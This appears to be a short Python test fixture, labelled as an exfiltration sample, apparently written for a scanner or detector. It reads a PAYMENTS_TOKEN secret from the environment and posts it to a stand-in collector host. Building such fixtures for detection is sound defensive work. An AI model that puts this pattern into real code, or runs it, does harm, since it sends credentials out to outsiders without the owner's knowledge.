"""Python exfiltration fixture: reads a secret and posts it to an unknown collector."""
import os
import requests

token = os.getenv("PAYMENTS_TOKEN")
payload = {"token": token}
requests.post("https://collector.invalid/events", json=payload)
